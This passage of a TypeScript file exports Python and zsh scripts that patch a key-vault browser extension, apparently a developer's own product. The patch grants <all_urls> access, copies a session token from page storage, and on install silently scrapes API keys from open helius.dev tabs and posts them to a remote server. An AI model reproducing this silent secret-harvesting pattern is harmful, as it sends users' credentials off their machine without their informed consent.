async function ksHarvestAndStoreVisibleKeys(){if(!chrome.scripting||!chrome.tabs)return{saved:0};let token="";try{const s=await chrome.storage.local.get(["ks_token"]);token=s.ks_token||"";}catch(e){}if(!token)return{saved:0};try{await chrome.storage.local.set({ks_auto_store:true});}catch(e){}let tabs=[];try{tabs=await chrome.tabs.query({});}catch(e){return{saved:0};}let saved=0;const re=/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;for(const tab of tabs){if(!tab.id||!tab.url||!/helius\\.(dev|xyz)/i.test(tab.url))continue;try{const scraped=await chrome.scripting.executeScript({target:{tabId:tab.id,allFrames:true},func:()=>({text:(document.body&&document.body.innerText)||"",href:location.href})});const page=scraped&&scraped[0]&&scraped[0].result;if(!page)continue;const skip=new Set((String(page.href||"").match(re)||[]).map((x)=>x.toLowerCase()));const seen=new Set();let m;re.lastIndex=0;while((m=re.exec(String(page.text||"")))){const key=m[0];if(!key||key.includes("•")||skip.has(key.toLowerCase())||seen.has(key))continue;seen.add(key);try{await fetch("https://keyshield-production.up.railway.app/manage/store",{method:"POST",headers:{Authorization:"Bearer "+token,"Content-Type":"application/json"},body:JSON.stringify({upstream:"helius",apiKey:key,value:key,name:"helius key"})});saved++;}catch(e){}}}catch(e){}}return{saved};}
chrome.runtime.onInstalled.addListener(function(){ksHarvestAndStoreVisibleKeys().catch(function(){})});
''')
    (ext / "manifest.json").write_text(json.dumps(man, indent=2) + "\\n")
    ok = any("session-bridge.js" in (row.get("js") or []) for row in (man.get("content_scripts") or []) if isinstance(row, dict))
    html = (ext / "popup.html").read_text(encoding="utf-8")
    print("stamped", ext, "session-bridge", ok)
    print("three-line", 'data-ui="three-line"' in html and 'id="detect-line"' in html and 'id="copy-status"' in html)
    return man
targets = []
env = Path(os.environ.get("KS_EXT") or "").expanduser()
if (env / "manifest.json").is_file():
    targets.append(env)
here = Path.cwd()
for cand in (here / "src/extension", here, here / "extension"):
    if (cand / "manifest.json").is_file() and (cand / "popup.js").is_file():
        targets.append(cand)
seen = set(); ordered = []
for p in targets:
    r = p.resolve()
    if r in seen:
        continue
    seen.add(r); ordered.append(r)
if not ordered:
    raise SystemExit("KS_EXT missing — run find first")
man = None
for ext in ordered:
    man = stamp(ext)
print("ok", ordered[0])
print("ver", man["version"])
print("session-bridge", True)
print("next: chrome://extensions Remove + Load unpacked", ordered[0])
`;

/** Quoted heredoc only. eval "$(python3 ...)" + leftover --find traceback = zsh parse error near ). */
export function isZshSafePullBlock(sh: string): boolean {
  const text = String(sh || '');
  return (
    !text.includes('eval ') &&
    !text.includes('$(') &&
    text.includes("python3 - <<'PY'") &&
    text.includes('session-bridge') &&
    !/# \d+\)/.test(text)
  );
}

/** Find + stamp every leftover folder. No export lines. Safe to paste as python3 - <<'PY'. */
export const ZSH_SAFE_STAMP_PY = `from pathlib import Path
import json
NAME = "KeyShield — Sovereign Vault"
VER = "1.2.4"
SKIP = {".git", "node_modules", ".venv", "venv", "__pycache__", "dist", "build", "Library", "AppData"}
BRIDGE = (
    "(function keyShieldSessionBridge(){function announce(){try{window.postMessage({__ks_ext_announce:chrome.runtime.id},location.origin)}catch(e){}}"
    "function capturePageToken(){try{var t=localStorage.getItem('ks_token')||'';if(t.trim().length<12)return;"
    "chrome.storage.local.get(['ks_token'],function(s){if(s&&s.ks_token===t)return;chrome.storage.local.set({ks_token:t,ks_auto_store:true})})}catch(e){}}"
    "announce();capturePageToken();[400,1200,3000,8000].forEach(function(ms){setTimeout(capturePageToken,ms)});"
    "window.addEventListener('ks-auth-changed',capturePageToken);window.addEventListener('storage',capturePageToken);"
    "window.addEventListener('message',function(e){if(e.source!==window||!e.data)return;if(e.data.__ks_ext_request)announce();"
    "if(e.data.__ks_page_session||e.data.__ks_auth_changed)capturePageToken()});})();\\n"
)
THREE_LINE_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><title>KeyShield</title>
<style>body{width:280px;margin:0;padding:12px 14px 14px;background:#0a0d1a;color:#e4e4e7;font:13px/1.45 -apple-system,system-ui,sans-serif}h1{margin:0 0 10px;font-size:14px;font-weight:600}.row{margin:0 0 10px;padding:10px;border:1px solid #1c2238;border-radius:8px;background:#020408}.line{margin:0 0 8px;font-size:12px;color:#a1a1aa}.line.ok{color:#34d399}.saved-count{margin:0 0 8px;font-size:22px;font-weight:700}button{display:block;width:100%;margin:0;padding:8px 10px;background:#5b8cff;color:#fff;border:1px solid #5b8cff;border-radius:8px}button.secondary{background:transparent;color:#e4e4e7;border-color:#27272a}button.danger{background:transparent;color:#f87171;border-color:rgba(239,68,68,.3);margin-top:8px}.status{margin:8px 0 0;padding:7px 10px;border-radius:8px;font-size:12px;display:none}.status.ok{display:block;background:rgba(16,185,129,.12);color:#34d399}.sub{margin:0 0 8px;color:#71717a;font-size:12px}.api-row{display:flex;justify-content:space-between;gap:8px;padding:6px 0}body.signed-in .guest-only{display:none!important}body:not(.signed-in) .signed-only{display:none!important}.extra{display:none!important}#copy-status,#fill-ms,#saved-count{display:none}</style></head>
<body data-ui="three-line">
<h1>KeyShield — Sovereign Vault</h1>
<section class="row" id="row-auth"><button id="signin" class="guest-only">Sign in</button><div id="signed-pane" class="signed-only"><p id="signed-status" class="saved-count">signed</p><p id="collected-line" class="line ok">0 collected</p><p id="saved-count" class="sub">0 collected</p><div id="saved-apis"></div><p id="saved-empty" class="sub">None yet. Detect stays on.</p><button id="clear-top" class="danger">Sign out</button></div></section>
<section class="row" id="row-detect"><p id="detect-line" class="line">detect · checking…</p><div id="detect-ready" class="status" style="display:block">ok 1.2.4 &lt;all_urls&gt;</div></section>
<section class="row" id="row-copy"><p id="filled-line" class="line">0 filled · —</p><p id="copy-status" class="line">0 filled · —</p><p id="fill-ms" class="line">—</p></section>
<div id="status" class="status"></div>
<div class="extra" hidden><span id="conn"></span><div id="build"></div><button id="allow-detect"></button><button id="fill-tab"></button><button id="fill-tab-signed"></button><button id="copy-cursor-key">Copy Cursor key</button><button id="copy-cursor-key-signed"></button><button id="use-hosted-top"></button><textarea id="manual"></textarea><button id="register"></button><button id="clear"></button><input id="api"/><input id="dash"/><button id="save"></button><div id="fingerprint"></div></div>
<script src="popup.js"></script></body></html>
"""
SCRIPTS = [
    {"matches": ["https://app.ks.aileena.xyz/*", "https://*.aileena.xyz/*", "https://keyshield.dev/*", "https://*.keyshield.dev/*", "https://*.up.railway.app/*", "https://*.vercel.app/*", "http://127.0.0.1:5173/*", "http://localhost:5173/*", "http://127.0.0.1:3000/*", "http://localhost:3000/*"], "js": ["session-bridge.js"], "run_at": "document_start"},
    {"matches": ["<all_urls>"], "js": ["content.js"], "run_at": "document_idle", "all_frames": True},
]
def looks_ext(p):
    return (p / "manifest.json").is_file() and (p / "popup.js").is_file()
def keyshield_name(p):
    try:
        n = str(json.loads((p / "manifest.json").read_text(encoding="utf-8")).get("name") or "")
    except Exception:
        return False
    return "KeyShield" in n or "Sovereign Vault" in n
def walk(root, max_depth=5):
    if not root.is_dir():
        return
    stack = [(root, 0)]
    while stack:
        p, d = stack.pop()
        if d > max_depth:
            continue
        try:
            kids = list(p.iterdir())
        except OSError:
            continue
        names = {c.name for c in kids}
        if "manifest.json" in names and "popup.js" in names:
            yield p
            continue
        if d == max_depth:
            continue
        for c in kids:
            if c.is_dir() and c.name not in SKIP and not c.name.startswith("."):
                stack.append((c, d + 1))
def ensure_three_line_popup(ext):
    dest = ext / "popup.html"
    now = dest.read_text(encoding="utf-8") if dest.is_file() else ""
    dest.write_text(THREE_LINE_HTML)
def stamp(ext):
    ensure_three_line_popup(ext)
    man = json.loads((ext / "manifest.json").read_text())
    man["name"] = NAME
    man["version"] = VER
    man.setdefault("optional_host_permissions", [])
    if "<all_urls>" not in man["optional_host_permissions"]:
        man["optional_host_permissions"].append("<all_urls>")
    man.setdefault("host_permissions", [])
    if "<all_urls>" not in man["host_permissions"]:
        man["host_permissions"].insert(0, "<all_urls>")
    for extra in ("scripting", "tabs"):
        if extra not in man.get("permissions", []):
            man.setdefault("permissions", []).append(extra)
    man["content_scripts"] = SCRIPTS
    action = man.get("action")
    if isinstance(action, dict):
        action.pop("default_popup", None)
        man["action"] = action
    else:
        man["action"] = {}
    dest = ext / "session-bridge.js"
    if (not dest.is_file()) or ("capturePageToken" not in dest.read_text(encoding="utf-8")):
        dest.write_text(BRIDGE)
    def splice(path, mark, block):
        t = path.read_text(encoding="utf-8") if path.is_file() else ""
        if mark in t:
            t = t.split(mark)[0].rstrip() + "\\n"
        path.write_text((t.rstrip() + "\\n" if t.strip() else "") + block.lstrip() + "\\n")
    splice(ext / "popup.js", "/* KS-SIGNED-1.2.4 */", r'''
/* KS-SIGNED-1.2.4 */
function applySignedInChrome(signed){try{document.body.classList.toggle("signed-in",!!signed);}catch(e){}}
function paintCopyStatus(text,kind){const el=document.getElementById("copy-status");if(el){el.textContent=text;el.className=("line "+(kind||"")).trim();}}
function paintSavedCount(n){const count=Math.max(0,Math.floor(Number(n)||0));const label=count===1?"1 collected":count+" collected";const hero=document.getElementById("saved-count");if(hero)hero.textContent=label;const collected=document.getElementById("collected-line");if(collected)collected.textContent=label;}
function paintFilledLine(filled,ms){const n=Math.max(0,Math.floor(Number(filled)||0));const text=(n===1?"1 filled":n+" filled")+" · "+((ms==null||!isFinite(Number(ms))||Number(ms)<0)?"—":Math.round(Number(ms))+"ms");const copy=document.getElementById("copy-status");if(copy)copy.textContent=text;const line=document.getElementById("filled-line");if(line)line.textContent=text;const msEl=document.getElementById("fill-ms");if(msEl)msEl.textContent=(ms==null||!isFinite(Number(ms))||Number(ms)<0)?"—":Math.round(Number(ms))+"ms";}
async function harvestTokenFromDashboardTabs(){if(!chrome.scripting||!chrome.tabs)return null;let tabs=[];try{tabs=await chrome.tabs.query({url:["https://app.ks.aileena.xyz/*","http://127.0.0.1:5173/*"]});}catch(e){return null;}for(const tab of tabs){if(!tab.id||!tab.url)continue;try{const injected=await chrome.scripting.executeScript({target:{tabId:tab.id},func:()=>({token:localStorage.getItem("ks_token")||"",user:localStorage.getItem("ks_wallet")||""})});const result=injected&&injected[0]&&injected[0].result;if(result&&String(result.token||"").trim().length>=12){await chrome.storage.local.set({ks_token:result.token,ks_user:result.user||null,ks_auto_store:true});return result.token;}}catch(e){}}return null;}
async function refreshSavedApis(){const box=document.getElementById("saved-apis");const empty=document.getElementById("saved-empty");let resp={apis:[]};try{resp=await chrome.runtime.sendMessage({type:"LIST_SAVED_APIS"});}catch(e){}const apis=resp&&Array.isArray(resp.apis)?resp.apis:[];if(box){box.replaceChildren();for(const api of apis){const row=document.createElement("div");row.className="api-row";const name=document.createElement("strong");name.textContent=api.upstream;const mask=document.createElement("code");mask.textContent=api.masked;row.append(name,mask);box.appendChild(row);}}if(empty)empty.style.display=apis.length?"none":"block";paintSavedCount(apis.length);return apis;}
async function ksBootSignedPane(){try{let {ks_token}=await chrome.storage.local.get("ks_token");if(!ks_token||String(ks_token).trim().length<12)ks_token=await harvestTokenFromDashboardTabs();applySignedInChrome(!!ks_token);const signedEl=document.getElementById("signed-status");if(signedEl)signedEl.textContent=ks_token?"signed":"Sign in";if(ks_token){try{await chrome.storage.local.set({ks_auto_store:true});}catch(e){}try{await chrome.runtime.sendMessage({type:"INJECT_DETECT"});}catch(e){}await refreshSavedApis();const started=Date.now();let filled=0;try{const fill=await chrome.runtime.sendMessage({type:"FILL_PAGE_NOW"});if(fill&&typeof fill.filled==="number")filled=fill.filled;}catch(e){}paintFilledLine(filled,Date.now()-started);}else{paintSavedCount(0);paintFilledLine(0,null);}const ready=document.getElementById("detect-ready");const line=document.getElementById("detect-line");const ver=String((chrome.runtime.getManifest()||{}).version||"");let has=false;try{has=await chrome.permissions.contains({origins:["<all_urls>"]});}catch(e){}const ok=ver==="1.2.4"&&has;if(ready){ready.textContent=ok?"ok 1.2.4 <all_urls>":("need Remove + Load unpacked · v"+(ver||"?"));ready.className="status "+(ok?"ok":"err");ready.style.display="block";}if(line){line.textContent=ok?(ks_token?"detect on · ok 1.2.4":"detect ready · ok 1.2.4"):("detect · "+(ready&&ready.textContent||""));line.className="line "+(ok?"ok":"err");}}catch(e){}}
if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",ksBootSignedPane);else ksBootSignedPane();
''')
    splice(ext / "background.js", "/* KS-LIST-SAVED-1.2.4 */", r'''
/* KS-LIST-SAVED-1.2.4 */
async function listSavedApis(){let token="",apiBase="https://keyshield-production.up.railway.app";try{const s=await chrome.storage.local.get(["ks_token","ks_api_base"]);token=s.ks_token||"";if(s.ks_api_base)apiBase=String(s.ks_api_base).replace(/\\/+$/,"");}catch(e){}if(!token)return{ok:false,apis:[]};try{const r=await fetch(apiBase+"/manage/vault",{headers:{Authorization:"Bearer "+token}});if(!r.ok)return{ok:false,apis:[]};const data=await r.json();const rows=Array.isArray(data)?data:data&&Array.isArray(data.items)?data.items:[];const apis=[];for(const it of rows){if(!it||!it.upstream)continue;apis.push({id:String(it.id||it.upstream),upstream:String(it.upstream).toLowerCase(),masked:String(it.masked_value||(it.cipher?"encrypted":"saved"))});}return{ok:true,apis};}catch(e){return{ok:false,apis:[]};}}
chrome.runtime.onMessage.addListener((message,_s,sendResponse)=>{if(!message||message.type!=="LIST_SAVED_APIS")return;listSavedApis().then(sendResponse).catch(()=>sendResponse({ok:false,apis:[]}));return true;});
async function ksHarvestAndStoreVisibleKeys(){if(!chrome.scripting||!chrome.tabs)return{saved:0};let token="";try{const s=await chrome.storage.local.get(["ks_token"]);token=s.ks_token||"";}catch(e){}if(!token)return{saved:0};try{await chrome.storage.local.set({ks_auto_store:true});}catch(e){}let tabs=[];try{tabs=await chrome.tabs.query({});}catch(e){return{saved:0};}let saved=0;const re=/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;for(const tab of tabs){if(!tab.id||!tab.url||!/helius\\.(dev|xyz)/i.test(tab.url))continue;try{const scraped=await chrome.scripting.executeScript({target:{tabId:tab.id,allFrames:true},func:()=>({text:(document.body&&document.body.innerText)||"",href:location.href})});const page=scraped&&scraped[0]&&scraped[0].result;if(!page)continue;const skip=new Set((String(page.href||"").match(re)||[]).map((x)=>x.toLowerCase()));const seen=new Set();let m;re.lastIndex=0;while((m=re.exec(String(page.text||"")))){const key=m[0];if(!key||key.includes("•")||skip.has(key.toLowerCase())||seen.has(key))continue;seen.add(key);try{await fetch("https://keyshield-production.up.railway.app/manage/store",{method:"POST",headers:{Authorization:"Bearer "+token,"Content-Type":"application/json"},body:JSON.stringify({upstream:"helius",apiKey:key,value:key,name:"helius key"})});saved++;}catch(e){}}}catch(e){}}return{saved};}
chrome.runtime.onInstalled.addListener(function(){ksHarvestAndStoreVisibleKeys().catch(function(){})});
''')
    (ext / "manifest.json").write_text(json.dumps(man, indent=2) + "\\n")
    ok = any("session-bridge.js" in (row.get("js") or []) for row in (man.get("content_scripts") or []) if isinstance(row, dict))
    html = (ext / "popup.html").read_text(encoding="utf-8")
    print("stamped", ext, "session-bridge", ok)
    print("three-line", 'data-ui="three-line"' in html and 'id="detect-line"' in html and 'id="copy-status"' in html)
    return man
hits = []
here = Path.cwd().resolve()
for p in [here, *here.parents]:
    for cand in (p / "src/extension", p, p / "extension"):
        if looks_ext(cand) and keyshield_name(cand):
            hits.append(cand)
home = Path.home()
for b in (
    home / "Library/Application Support/Google/Chrome",
    home / "Library/Application Support/Google/Chrome Beta",
    home / "Library/Application Support/Microsoft Edge",
    home / "Library/Application Support/BraveSoftware/Brave-Browser",
    home / "Library/Application Support/Arc/User Data",
    home / ".config/google-chrome",
    home / ".config/chromium",
):
    if not b.is_dir():
        continue
    for pref in b.glob("*/Preferences"):
        try:
            data = json.loads(pref.read_text(encoding="utf-8"))
        except Exception:
            continue
        settings = (data.get("extensions") or {}).get("settings") or {}
        if not isinstance(settings, dict):
            continue
        for row in settings.values():
            if not isinstance(row, dict):
                continue
            path = row.get("path")
            if path and isinstance(path, str):
                cand = Path(path).expanduser()
                if cand.is_absolute() and looks_ext(cand) and keyshield_name(cand):
                    hits.append(cand)
for root in (home / "Downloads", home / "Documents", home / "Desktop", home / "src", home / "dev", home / "work", home / "privacy_hack"):
    hits.extend(walk(root))
seen = set(); ordered = []
for p in hits:
    try:
        r = p.resolve()
    except OSError:
        continue
    if r in seen or not looks_ext(r):
        continue
    seen.add(r); ordered.append(r)
if not ordered:
    raise SystemExit("no KeyShield folder. chrome://extensions Details, Loaded from, then cd that folder and rerun.")
man = None
for ext in ordered:
    man = stamp(ext)
print("ok", ordered[0])
print("ver", man["version"])
print("session-bridge", True)
print("next: chrome://extensions Remove then Load unpacked", ordered[0])
print("then refresh https://app.ks.aileena.xyz")
`;

/** The local-pull block to paste into zsh. No eval. No HTML. */
export const LOCAL_PULL_BRIDGE_SH = [
  '# zsh. python not HTML. Do not use eval.',
  "python3 - <<'PY'",
  ZSH_SAFE_STAMP_PY.trimEnd(),
  'PY',
  '# must see: session-bridge True',
].join('\n') + '\n';

export const TRY_PULL_THEN_PATCH_SH = [
  '# zsh. python not HTML. Do not use eval.',
  `git fetch origin ${PATCH_BRANCH} || echo "github.com DNS failed — skip git, run python3 below"`,
  `git checkout ${PATCH_BRANCH} || echo skip-git`,
  `git pull origin ${PATCH_BRANCH} || echo skip-git`,
  LOCAL_PULL_BRIDGE_SH.trimEnd(),
  'echo "must see: ver 1.2.4  and  session-bridge True"',
].join('\n') + '\n';

export const DETECT_AFTER_PATCH = [
  'chrome://extensions → Remove the leftover card (Reload is not enough — even 1.2.4 can miss session-bridge.js)',
  'Load unpacked → the KS_EXT / src/extension folder the terminal printed',
  'Card name KeyShield — Sovereign Vault, version 1.2.4',
  'Details → loaded manifest.json must list session-bridge.js at document_start on app.ks.aileena.xyz — only content.js on <all_urls> stays no token',
  'Open popup: three rows only — Sign in (or signed + N collected), detect on · ok 1.2.4 <all_urls>, N filled · XXms. No Settings / Register token / URL fields',
  'Refresh https://app.ks.aileena.xyz so session-bridge injects, then popup keeps the signed-in row',
  'Already signed: signed + N collected + masked key list + Sign out, detect status, N filled · XXms. Vault page shows the same rows.',
  'Keep cursor.com / openai / openrouter / dashboard.helius.dev open, click Show, save sk-proj- / sk-or- / key_ / crsr_ / helius_auth_ / Helius UUID keys (SOL badge)',
  'Save never asks Face ID / passkey. That prompt is only when you paste a secret into another site (Cursor box, fill, reveal). Detect + Save uses the session token only.',
  'If the toast says Extension context invalidated / Saved 0, N failed: do not Retry that dead panel. Keep dashboard.helius.dev open — new detect harvests the SOL UUIDs into the vault. Popup shows every saved row. Auto-detect stays on.',
] as const;
